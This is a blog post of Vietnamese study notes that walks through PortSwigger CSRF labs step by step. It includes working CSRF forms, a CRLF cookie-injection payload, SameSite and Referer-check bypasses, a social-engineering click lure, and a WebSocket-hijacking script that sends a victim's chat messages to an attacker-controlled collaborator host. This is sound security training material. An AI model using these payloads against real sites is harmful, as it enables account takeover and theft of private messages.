@@ -1,0 +1,497 @@
+---
+layout: post
+title: "Cross-site request forgery (CSRF)"
+render_with_liquid: false
+categories:
+  - PortSwigger
+tags:
+  - portswigger
+  - cross-site-request-forgery-csrf
+source_collection: notion_portswigger
+---
+Created by: Nguyễn Giang Nam
+Topics: Client-side
+
+```jsx
+<form method="POST" action="https://victim.com/my-account/change-email">
+    <input type="hidden" name="email" value="anything%40web-security-academy.net">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+```
+
+Server sử dụng CSRF-Token trong method POST mà không sử dụng CSRF trong method GET
+
+```php
+<form action="https://target.com/my-account/change-email">
+    <input type="hidden" name="email" value="attacker%40evil.com">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+```
+
+Ứng dụng validate chính xác csrf khi nó xuất hiện trong yêu cầu, nhưng bỏ qua validate khi nó không xuất hiện trong yêu cầu 
+
+Khi CSRF xuất hiện trong yêu cầu
+
+![image.png](/assets/img/portswigger/cross-site-request-forgery-csrf/image.png)
+
+Khi CSRF không xuất hiện trong yêu cầu
+
+![image.png](/assets/img/portswigger/cross-site-request-forgery-csrf/image%201.png)
+
+Ứng dụng không xác thực xem CSRF có thuộc cùng phiên với người dùng đang thực hiện yêu cầu hay không. Thay vào đó, ứng dụng duy trì một nhóm mã CSRF toàn cục mà nó đã phát hành và chấp nhận bất kỳ mã thông báo nào xuất hiện trong nhóm này.
+
+```php
+```
+
+Non-session cookie là 1 dạng trong đó cookie 
+
+- Vừa có session để quản lý phiên
+- Vừa có mã CSRF Key để quản lý các CSRF Token
+- Session và CSRF key này không bị ràng buộc lẫn nhau
+
+Điều kiện số 3 tạo ra lỗ hổng đó là attacker sẽ sử dụng CSRF Key của chính mình để tạo trước 1 yêu cầu, và victim sẽ thực hiện thành công yêu cầu đó  
+
+```php
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
+
+csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
+```
+
+**Các bước khai thác**
+
+1. **Xác nhận rằng trong cookie vừa có session để quản lý phiên và vừa có mã CSRF Key để quản lý các CSRF Token**
+2. **Đăng nhập vào 2 tài khoản để lấy 2 cookie hợp lệ bao gồm cả session và CSRF Key**
+3. Thực hiện gửi 1 yêu cầu có chứa CSRF Token trong body gửi đi, tiến hành hoán đổi CSRF Key và csrf trong body của 2 phiên cho nhau
+4. Nếu sau khi hoán đổi, mà yêu cầu vẫn được thực hiện thì xác nhận đây là lỗ hổng
+
+```php
+#Để từ lỗ hổng đến khai thác thực tế được, ta cần ứng dụng bị thêm 1 lỗ hổng nữa đó là CRLF
+<form name="change-email-form" action="/my-account/change-email" method="POST">
+    <label>Email</label>
+    <input required type="email" name="email" value="attacker@normal-website.com">
+    <input required type="hidden" name="csrf" value="csrf của attacker">
+    <button class='button' type='submit'> Update email </button>
+</form>
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+```
+
+```php
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+
+csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
+```
+
+Trong một biến thể tiếp theo về lỗ hổng ở **Test 04,** một số ứng dụng không duy trì bất kỳ bản ghi nào của các mã csrf nào đã được phát hành, mà thay vào đó sao chép mỗi mã csrf vào trong một cookie và tham số yêu cầu. Khi yêu cầu tiếp theo được xác thực, ứng dụng chỉ cần xác minh rằng mã csrf được gửi trong tham số yêu cầu khớp với giá trị được gửi trong cookie. Điều này đôi khi được gọi là phòng thủ "đệ trình kép" đối với CSRF và được ủng hộ vì nó đơn giản để thực hiện và tránh sự cần thiết cho bất kỳ trạng thái phía máy chủ nào:
+
+Trong tình huống này, kẻ tấn công lại có thể thực hiện một cuộc tấn công CSRF nếu trang web chứa bất kỳ chức năng cài đặt cookie nào. Ở đây, kẻ tấn công không cần phải có được mã thông báo hợp lệ của riêng họ. Họ chỉ đơn giản là phát minh ra một mã thông báo (có lẽ ở định dạng cần thiết, nếu điều đó đang được kiểm tra), tận dụng hành vi thiết lập cookie để đặt cookie của họ vào trình duyệt của nạn nhân và cung cấp mã thông báo của họ cho nạn nhân trong cuộc tấn công CSRF của họ
+
+```jsx
+/*
+Server chỉ nhận method POST. 
+Payload dưới đây submit form bằng method GET và sử dụng _method=POST để ghi đè lại 
+giá trị của method nhằm đánh lừa server
+Vì samesite lax không cho phép attacker tự động submit form trên method GET nên cần ghi đè lại bằng method _POST
+*/
+<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
+    <input type="hidden" name="_method" value="POST">
+    <input type="hidden" name="recipient" value="hacker">
+    <input type="hidden" name="amount" value="1000000">
+</form>
+```
+
+```jsx
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+    <form action="https://0ae9006304c91df2808f21c500bc00a9.web-security-academy.net/my-account/change-email" method="GET">
+<input type="hidden" name="_method" value="POST">
+      <input type="hidden" name="email" value="attacker&#46;gnam&#64;gmail" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+```
+
+&gt; Tham khảo **SameSite Strict**: [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-using-get-requests](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-using-get-requests)
+&gt; 
+
+```jsx
+// PoC Exploit
+<script>
+window.location = 'https://0a13001d04f8483080009915007a00ee.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1'
+</script>
+```
+
+```jsx
+// Giải thích
+// Lợi dụng có thể chèn path traversal vào postId để điều hướng đến endpoint không được bảo vệ bởi csrf và cách này có thể bypass SameSite Strict
+redirectOnConfirmation = (blogPath) => {
+    setTimeout(() => {
+        const url = new URL(window.location);
+        const postId = url.searchParams.get("postId");
+        window.location = blogPath + '/' + postId;
+    }, 3000);
+}
+```
+
+&gt; Kịch bản: Lợi dụng xss ở 1 bên thứ 3 → tấn công web socket → đọc được tin nhắn của victim với web server
+&gt; 
+1. **Tìm được 1 domain thỏa mãn cấu hình cors về samesite**
+    
+    ![image.png](/assets/img/portswigger/cross-site-request-forgery-csrf/image%202.png)
+    
+2. **Trên domain được cấu hình cors tìm được ở trên, có tồn tại lỗ hổng XSS**
+    
+    ![image.png](/assets/img/portswigger/cross-site-request-forgery-csrf/image%203.png)
+    
+3. **Tạo mã CSWSH (cross site web socket hijacking)**
+    
+    ```jsx
+    <script>
+    		// 1. Kết nối tới websocket
+        var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+        ws.onopen = function() {
+            ws.send("READY");
+        };
+        // 2. Sau khi kết nối web socket, gửi sự kiện mà server trả về đến COLLABORATOR của attacker
+        ws.onmessage = function(event) {
+            fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+        };
+        // 3. Nếu COLLABORATOR nhận được yêu cầu gửi đến thì chứng tỏ web socket này bị lỗ hổng CSWSH và có thể làm tiếp được
+    </script>
+    ```
+    
+4. **Urlencoded mã CSWSH ở trên** 
+    
+    ![image.png](/assets/img/portswigger/cross-site-request-forgery-csrf/image%204.png)
+    
+5. **Đưa mã CSWSH được urlencoded ở trên vào tham số username bị lỗ hổng xss ở trên**
+    
+    Ở bước trên cần urlencoded script vì script nằm trên url
+    
+    ![image.png](/assets/img/portswigger/cross-site-request-forgery-csrf/image%205.png)
+    
+6. **Cuối dùng là dùng đường link này để gửi tới victim, lúc này ở bên victim sẽ thực thi mã CSWSH**
+    
+    Attacker có thể lắng nghe được các thông tin như lịch sử đoạn chat mà victim và web server giao tiếp với nhau từ trước
+    
+    ![{26970711-5C7E-471B-AA15-E3356D35D00D}.png](/assets/img/portswigger/cross-site-request-forgery-csrf/26970711-5C7E-471B-AA15-E3356D35D00D.png)
+    
+    Ta có thể lấy được thông tin nhạy cảm
+    
+    ![image.png](/assets/img/portswigger/cross-site-request-forgery-csrf/image%206.png)
+    
+
+&gt; Kịch bản: xss → trigger oauth flow để victim đăng nhập → thay đổi email của victim
+&gt; 
+
+**Tóm tắt luồng tấn công cuối cùng**
+
+1. Nạn nhân truy cập vào trang độc hại của bạn.
+2. Trang web yêu cầu nạn nhân nhấp chuột.
+3. Khi nạn nhân nhấp chuột, một cửa sổ pop-up sẽ mở ra, trỏ đến trang /social-login.
+4. Luồng OAuth tự động diễn ra, và ứng dụng web cấp cho trình duyệt của nạn nhân một cookie session mới.
+5. Sau 5 giây, trang độc hại của bạn gửi một yêu cầu POST để thay đổi email của nạn nhân.
+6. Vì yêu cầu này được gửi đi ngay sau khi cookie được tạo, nó nằm trong "phạm vi cửa sổ thời gian" 2 phút của Chrome, cho phép cookie SameSite=Lax được gửi kèm.
+7. Máy chủ nhận được yêu cầu hợp lệ với cookie phiên và thực hiện thay đổi email.
+
+**Tổng quan về bài Lab**
+
+- **Mục tiêu:** Thực hiện một cuộc tấn công CSRF (Cross-Site Request Forgery) để thay đổi email của nạn nhân.
+- **Trở ngại:** Chức năng này được bảo vệ bởi cờ SameSite=Lax trên cookie phiên (session cookie). Cờ này ngăn trình duyệt gửi cookie trong các yêu cầu POST từ một trang web khác (cross-site).
+- **Điểm yếu mấu chốt:**
+    1. Ứng dụng web cấp một cookie phiên mới mỗi khi người dùng hoàn tất luồng đăng nhập OAuth.
+    2. Trình duyệt Chrome (và các trình duyệt dựa trên Chromium) có một "cửa sổ thời gian" khoảng 2 phút. Trong khoảng thời gian này, sau khi một cookie được tạo ra từ một điều hướng cấp cao nhất (top-level navigation), nó vẫn sẽ được gửi đi kèm với các yêu cầu POST cross-site.
+- **Ý tưởng tấn công:** Chúng ta sẽ ép trình duyệt của nạn nhân thực hiện đăng nhập lại qua OAuth để "làm mới" cookie phiên. Ngay sau đó, chúng ta sẽ gửi yêu cầu POST để thay đổi email, tận dụng "cửa sổ thời gian" 2 phút nói trên để cookie được gửi kèm, và cuộc tấn công sẽ thành công.
+
+---
+
+**Hướng dẫn từng bước chi tiết**
+
+**Bước 1: Nghiên cứu chức năng thay đổi email**
+
+1. **Hành động:** Đăng nhập vào lab bằng tài khoản mạng xã hội được cung cấp (wiener:peter). Sau đó, thử thay đổi email của chính bạn thành một địa chỉ bất kỳ, ví dụ test@test.com.
+2. **Phân tích:** Mở Burp Suite và xem lại lịch sử các yêu cầu trong tab Proxy &gt; HTTP history.
+    - Tìm yêu cầu POST /my-account/change-email. Bạn sẽ thấy phần thân (body) của nó rất đơn giản, chỉ chứa tham số email. Quan trọng nhất, nó **không có bất kỳ token chống CSRF nào**. Đây là dấu hiệu đầu tiên cho thấy nó có thể bị tấn công.
+    - Tìm yêu cầu GET /oauth-callback?code=[...]. Đây là yêu cầu cuối cùng trong luồng đăng nhập OAuth. Xem phần phản hồi (response) của nó. Trong phần header Set-Cookie, bạn sẽ thấy cookie session được thiết lập. Lưu ý rằng nó **không có thuộc tính SameSite** một cách rõ ràng. Khi đó, các trình duyệt hiện đại như Chrome sẽ mặc định áp dụng SameSite=Lax.
+    
+    &gt; Kiến thức cốt lõi: SameSite=Lax có nghĩa là cookie sẽ không được gửi trong các yêu cầu cross-site như POST, PUT, DELETE. Tuy nhiên, nó vẫn được gửi trong các yêu cầu GET (ví dụ khi bạn nhấp vào một liên kết từ trang khác).
+    &gt; 
+
+**Bước 2: Thử tấn công CSRF cơ bản**
+
+1. **Hành động:** Đi đến exploit server và tạo một trang HTML tấn công đơn giản.codeHtml
+    
+    ```jsx
+    <!-- Exploit Server -->
+    <script>
+        history.pushState('', '', '/')
+    </script>
+    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="hacker@evil.com" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+    ```
+    
+    - **Lưu ý:** Thay YOUR-LAB-ID bằng ID lab của bạn.
+2. **Phân tích kết quả:**
+    - Lưu và xem exploit này. Yêu cầu POST sẽ được gửi đến máy chủ của lab.
+    - Tuy nhiên, khi bạn kiểm tra trong Burp, bạn sẽ thấy yêu cầu POST /my-account/change-email này **không chứa cookie session**.
+    - **Lý do:** Vì yêu cầu POST này được khởi tạo từ một trang web khác (exploit server) bởi một đoạn script (document.forms[0].submit()), chính sách SameSite=Lax đã ngăn trình duyệt đính kèm cookie. Do đó, server không biết bạn là ai và không thể thay đổi email. Tấn công thất bại.
+
+**Bước 3: Vượt qua hạn chế của SameSite bằng cách làm mới cookie**
+
+Đây là phần quan trọng nhất của bài lab.
+
+1. **Ý tưởng:**
+    - Chúng ta nhận thấy rằng mỗi khi truy cập /social-login, trang web sẽ tự động bắt đầu luồng OAuth và cấp một cookie session mới.
+    - Chúng ta có thể buộc trình duyệt của nạn nhân truy cập vào trang /social-login này trong một cửa sổ mới.
+    - Ngay sau khi cookie mới được cấp, chúng ta sẽ gửi yêu cầu POST thay đổi email. Vì cookie vừa được tạo, nó sẽ nằm trong "cửa sổ thời gian" 2 phút và sẽ được gửi kèm theo yêu cầu.
+2. **Hành động:** Cập nhật mã trên exploit server.codeHtml
+    
+    ```jsx
+    <!-- Exploit Server -->
+    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+        <input type="hidden" name="email" value="pwned@web-security-academy.net">
+    </form>
+    <script>
+        // Mở một cửa sổ mới để bắt đầu luồng OAuth và làm mới cookie
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+    
+        // Đợi 5 giây để luồng OAuth hoàn tất
+        setTimeout(changeEmail, 5000);
+    
+        function changeEmail(){
+            document.forms[0].submit();
+        }
+    </script>
+    ```
+    
+3. **Phân tích kết quả:**
+    - Lưu và xem exploit này. Bạn sẽ thấy trình duyệt của mình **chặn cửa sổ pop-up** được mở bởi window.open().
+    - **Lý do:** Các trình duyệt hiện đại chặn các pop-up được tạo tự động bởi script mà không có sự tương tác nào từ người dùng (như một cú nhấp chuột). Đây là một cơ chế bảo vệ chống lại các quảng cáo và hành vi gây phiền nhiễu.
+    - Cuộc tấn công vẫn thất bại vì cửa sổ pop-up không mở ra, do đó cookie không được làm mới.
+
+**Bước 4: Vượt qua trình chặn pop-up**
+
+1. **Ý tưởng:** Chúng ta cần lừa nạn nhân nhấp chuột vào trang của chúng ta. Một khi người dùng đã nhấp chuột, trình duyệt sẽ cho phép script mở một cửa sổ pop-up.
+2. **Hành động:** Hoàn thiện mã tấn công cuối cùng trên exploit server.codeHtml
+    
+    ```jsx
+    <!-- Exploit Server -->
+    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+        <input type="hidden" name="email" value="pwned@portswigger.net">
+    </form>
+    <!-- Thêm một lời kêu gọi hành động để lừa người dùng nhấp chuột -->
+    <h3>Click here to win a prize!</h3>
+    <script>
+        // Chỉ chạy mã khi người dùng nhấp vào bất cứ đâu trên trang
+        window.onclick = () => {
+            // Bây giờ window.open sẽ được cho phép vì có sự tương tác của người dùng
+            window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+            
+            // Đợi 5 giây
+            setTimeout(changeEmail, 5000);
+        }
+    
+        function changeEmail() {
+            document.forms[0].submit();
+        }
+    </script>
+    ```
+    
+3. **Kiểm tra và thực hiện tấn công:**
+    - Lưu lại mã exploit.
+    - View exploit. Trang web sẽ hiển thị dòng chữ "Click here to win a prize!".
+    - **Nhấp chuột** vào trang. Ngay lập tức, một tab/cửa sổ mới sẽ mở ra và nhanh chóng thực hiện luồng đăng nhập OAuth rồi tự đóng lại (hoặc chuyển hướng). Đây chính là quá trình làm mới cookie.
+    - Quay lại Burp, bạn sẽ thấy sau khoảng 5 giây, yêu cầu POST /my-account/change-email đã được gửi đi. Lần này, nó **có chứa cookie session mới**.
+    - Tấn công thành công! Email của bạn đã được thay đổi.
+    - Cuối cùng, nhấp vào "Deliver exploit to victim" để hoàn thành bài lab.
+
+**Tổng quan về bài Lab**
+
+- **Mục tiêu:** Thực hiện một cuộc tấn công CSRF để thay đổi địa chỉ email của nạn nhân.
+- **Cơ chế phòng thủ:** Ứng dụng web cố gắng chống lại CSRF bằng cách kiểm tra header Referer trong các yêu cầu. Nó sẽ xác minh xem yêu cầu có phải đến từ chính tên miền của ứng dụng hay không.
+- **Điểm yếu mấu chốt:** Cơ chế phòng thủ này chỉ được kích hoạt **khi header Referer tồn tại**. Nếu một yêu cầu được gửi đến mà **không có header Referer**, ứng dụng sẽ bỏ qua việc kiểm tra và xử lý yêu cầu đó như bình thường.
+- **Ý tưởng tấn công:** Chúng ta sẽ tạo một trang web độc hại, và trên trang đó, chúng ta sẽ sử dụng một kỹ thuật để yêu cầu trình duyệt của nạn nhân gửi đi một yêu cầu thay đổi email mà **không đính kèm header Referer**.
+
+---
+
+**Lý thuyết cốt lõi: Header Referer và cách phòng thủ**
+
+- **Header Referer là gì?** Khi bạn nhấp vào một liên kết hoặc gửi một biểu mẫu từ trang A đến trang B, trình duyệt thường sẽ thêm một header vào yêu cầu gửi đến trang B, gọi là Referer. Giá trị của header này chính là URL của trang A.
+- **Phòng thủ dựa trên Referer:** Một số trang web kiểm tra header này. Ví dụ, khi nhận được yêu cầu thay đổi email, trang web sẽ kiểm tra xem Referer có phải là https://ten-mien-cua-trang-web.com/my-account không. Nếu Referer là một tên miền khác (ví dụ: https://trang-web-cua-hacker.com), yêu cầu sẽ bị từ chối.
+- **Tại sao cách phòng thủ này yếu?** Việc kiểm tra này có thể bị bỏ qua. Một trong những cách phổ biến nhất là khi lập trình viên chỉ kiểm tra if (header_Referer_ton_tai) { ... } mà quên mất trường hợp header này không tồn tại.
+
+---
+
+**Bước 1: Phân tích cơ chế phòng thủ của ứng dụng**
+
+Đây là bước quan trọng nhất để xác định điểm yếu.
+
+1. **Hành động:**
+    - Đăng nhập vào lab bằng tài khoản wiener:peter.
+    - Thay đổi địa chỉ email của bạn thành một giá trị bất kỳ (ví dụ: test1@example.com).
+    - Trong Burp Suite, vào tab Proxy &gt; HTTP history, tìm yêu cầu POST /my-account/change-email.
+    - Chuột phải vào yêu cầu này và chọn "Send to Repeater".
+2. **Phân tích trong Burp Repeater:**
+    - **Trường hợp 1 (Bình thường):** Nhấn "Send". Yêu cầu được chấp nhận, bạn nhận được phản hồi chuyển hướng 302 Found. Header Referer đang trỏ đến chính trang web của lab.
+    - **Trường hợp 2 (Giả mạo Referer):** Sửa đổi giá trị của header Referer, ví dụ: Referer: https://evil-user.com. Nhấn "Send". Bạn sẽ nhận được thông báo lỗi, ví dụ "Invalid referer header". Điều này xác nhận rằng **ứng dụng có kiểm tra header Referer**.
+    - **Trường hợp 3 (Xóa Referer):** Xóa toàn bộ dòng header Referer. Nhấn "Send". Bạn sẽ thấy yêu cầu lại được **chấp nhận** và nhận được phản hồi 302 Found. Đây chính là lỗ hổng! Ứng dụng bỏ qua việc kiểm tra khi không tìm thấy header này.
+
+**Bước 2: Xây dựng mã khai thác (Exploit)**
+
+Bây giờ chúng ta biết rằng chỉ cần gửi yêu cầu POST mà không có Referer, chúng ta sẽ thành công.
+
+1. **Hành động:**
+    - Đi đến exploit server.
+    - Tạo một trang HTML cơ bản để tự động gửi yêu cầu thay đổi email.
+    - Để ngăn trình duyệt gửi header Referer, chúng ta sẽ thêm thẻ &lt;meta&gt; đặc biệt vào phần &lt;head&gt; của trang.
+2. **Mã khai thác hoàn chỉnh:**
+    
+    ```jsx
+    <html>
+      <head>
+        <!-- Thẻ meta này chỉ thị cho trình duyệt không gửi header Referer -->
+        <meta name="referrer" content="no-referrer">
+      </head>
+      <body>
+        <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+          <input type="hidden" name="email" value="pwned@web-security-academy.net">
+        </form>
+        <script>
+          document.forms[0].submit();
+        </script>
+      </body>
+    </html>
+    ```
+    
+    - **Lưu ý:** Hãy thay YOUR-LAB-ID bằng ID lab của bạn.
+    - **Giải thích:**
+        - &lt;meta name="referrer" content="no-referrer"&gt;: Đây là chỉ thị cho trình duyệt. Khi bất kỳ yêu cầu nào được gửi đi từ trang này (bao gồm cả việc submit form của chúng ta), trình duyệt sẽ không đính kèm header Referer.
+        - Phần còn lại là một form CSRF tiêu chuẩn, nó chứa email mới và tự động được gửi đi bằng JavaScript.
+
+**Bước 3: Gửi exploit cho nạn nhân và hoàn thành lab**
+
+1. **Hành động:**
+    - Trong exploit server, dán mã khai thác ở trên vào phần Body.
+    - Nhấp vào "Store" để lưu lại.
+    - Nhấp vào "Deliver exploit to victim".
+2. **Điều gì xảy ra ở phía sau?**
+    - Hệ thống của lab sẽ mô phỏng việc nạn nhân (đã đăng nhập) truy cập vào trang exploit của bạn.
+    - Trình duyệt của nạn nhân tải trang HTML.
+    - Thẻ &lt;meta&gt; ngăn không cho header Referer được tạo.
+    - JavaScript tự động gửi form POST /my-account/change-email.
+    - Máy chủ của lab nhận được yêu cầu này. Vì nó không có header Referer, cơ chế kiểm tra bị bỏ qua.
+    - Yêu cầu được xử lý thành công, và email của nạn nhân bị thay đổi.
+    - Bài lab được giải quyết.
+
+**Tổng quan về bài Lab**
+
+- **Mục tiêu:** Thực hiện một cuộc tấn công CSRF để thay đổi email của nạn nhân.
+- **Cơ chế phòng thủ:** Ứng dụng web kiểm tra header Referer để đảm bảo yêu cầu đến từ chính nó.
+- **Điểm yếu mấu chốt:** Cách kiểm tra rất "ngây thơ". Thay vì kiểm tra xem Referer có **bắt đầu bằng** tên miền của ứng dụng hay không, nó chỉ kiểm tra xem tên miền của ứng dụng có **xuất hiện ở bất kỳ đâu** trong chuỗi Referer hay không.
+- **Ý tưởng tấn công:** Chúng ta sẽ tạo một trang tấn công trên exploit server. URL của trang này sẽ được chúng ta tùy chỉnh để chứa tên miền của trang web lab trong phần query string (phần sau dấu ?). Khi trình duyệt gửi yêu cầu từ trang của chúng ta, header Referer sẽ chứa URL này, và nó sẽ vượt qua được cơ chế kiểm tra lỏng lẻo của ứng dụng
+
+---
+
+**Lý thuyết cốt lõi: Lỗi logic trong việc xác thực Referer**
+
+Hãy tưởng tượng trang web lab có tên miền là vulnerable-website.com.
+
+- **Cách kiểm tra đúng:** Máy chủ nên kiểm tra Referer có bắt đầu bằng https://vulnerable-website.com/ hay không.
+    - Referer: https://vulnerable-website.com/my-account -&gt; Hợp lệ.
+    - Referer: https://evil-user.com/ -&gt; Không hợp lệ.
+- **Cách kiểm tra sai (lỗi trong bài lab):** Máy chủ chỉ kiểm tra xem chuỗi vulnerable-website.com có tồn tại trong header Referer hay không.
+    - Referer: https://vulnerable-website.com/my-account -&gt; Hợp lệ.
+    - Referer: https://evil-user.com/?vulnerable-website.com -&gt; **Cũng hợp lệ!** Đây chính là lỗ hổng.
+
+Ngoài ra, chúng ta cần lưu ý một hành vi của trình duyệt hiện đại:
+
+- **Bảo vệ quyền riêng tư của trình duyệt:** Để tránh rò rỉ dữ liệu nhạy cảm có thể nằm trong URL, nhiều trình duyệt sẽ tự động cắt bỏ phần query string khỏi header Referer. Điều này sẽ làm hỏng cuộc tấn công của chúng ta.
+- **Cách vượt qua:** Chúng ta có thể ra lệnh cho trình duyệt gửi đầy đủ URL (bao gồm cả query string) bằng cách thêm header Referrer-Policy: unsafe-url vào phản hồi của trang exploit server.
+
+---
+
+**Bước 1: Tìm ra lỗ hổng trong việc xác thực Referer**
+
+1. **Hành động:**
+    - Đăng nhập vào lab bằng tài khoản wiener:peter.
+    - Thay đổi email của bạn và tìm yêu cầu POST /my-account/change-email trong Proxy &gt; HTTP history.
+    - Gửi yêu cầu này đến **Burp Repeater**.
+2. **Phân tích trong Burp Repeater:**
+    - **Test 1 (Từ chối):** Thay đổi giá trị của header Referer thành một tên miền hoàn toàn khác, ví dụ Referer: https://evil-user.com/. Nhấn "Send". Yêu cầu sẽ bị từ chối với lỗi "Invalid referer header". Điều này xác nhận có tồn tại cơ chế kiểm tra.
+    - **Test 2 (Chấp nhận - "Aha!" moment):** Giữ nguyên tên miền giả mạo, nhưng thêm tên miền của lab vào cuối URL dưới dạng query string. Ví dụ:
+        
+        Referer: https://evil-user.com/?YOUR-LAB-ID.web-security-academy.net
+        
+        (Nhớ thay YOUR-LAB-ID bằng ID lab của bạn).
+        
+    - Nhấn "Send". Lần này, yêu cầu được **chấp nhận**! Chúng ta đã xác nhận được điểm yếu: chỉ cần tên miền của lab xuất hiện ở đâu đó trong Referer là đủ.
+
+**Bước 2: Xây dựng mã khai thác ban đầu**
+
+Bây giờ, chúng ta cần tạo một trang web mà khi trình duyệt gửi yêu cầu từ đó, header Referer sẽ có dạng như chúng ta đã thử nghiệm thành công ở trên.
+
+1. **Hành động:**
+    - Đi đến exploit server.
+    - Chúng ta sẽ sử dụng hàm JavaScript history.pushState() để thay đổi URL hiển thị trên thanh địa chỉ của trình duyệt mà không cần tải lại trang. Điều này sẽ làm cho URL của chúng ta chứa tên miền của lab.
+2. **Mã khai thác:**codeHtml
+    
+    ```jsx
+    <html>
+      <body>
+        <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+          <input type="hidden" name="email" value="pwned@web-security-academy.net" />
+        </form>
+        <script>
+          // Thay đổi URL của trang hiện tại để chứa tên miền của lab
+          history.pushState('', '', '/?YOUR-LAB-ID.web-security-academy.net');
+          
+          // Gửi form
+          document.forms[0].submit();
+        </script>
+      </body>
+    </html>
+    ```
+    
+    - **Giải thích history.pushState():** Hàm này nói với trình duyệt, "Này, hãy giả vờ như URL hiện tại là /?YOUR-LAB-ID... nhé". Khi form được submit, trình duyệt sẽ lấy URL "giả" này để tạo ra header Referer.
+
+**Bước 3: Vượt qua cơ chế bảo vệ của trình duyệt**
+
+1. **Vấn đề:** Nếu bạn thử "View exploit" ngay bây giờ, cuộc tấn công có thể sẽ thất bại. Lý do là trình duyệt của bạn sẽ cắt bỏ phần ?YOUR-LAB-ID... khỏi header Referer.
+2. **Giải pháp:** Chúng ta cần thêm header Referrer-Policy: unsafe-url vào phản hồi từ exploit server.
+3. **Hành động:**
+    - Trong giao diện của exploit server, tìm đến phần "Head".
+    - Thêm vào đó dòng sau:
+        
+        Referrer-Policy: unsafe-url
+        
+    - **Lưu ý quan trọng:** Trong header này, từ "Referrer" được viết đúng chính tả (có hai chữ 'r'), khác với header Referer trong yêu cầu HTTP (chỉ có một chữ 'r' do lỗi lịch sử).
+
+**Bước 4: Hoàn thiện và gửi Exploit cho nạn nhân**
+
+1. **Hành động:**
+    - Đảm bảo bạn đã thay YOUR-LAB-ID trong phần Body.
+    - Đảm bảo bạn đã thêm header Referrer-Policy: unsafe-url trong phần Head.
+    - Nhấp "Store" để lưu lại.
+    - Nhấp "Deliver exploit to victim" để hoàn thành bài lab.
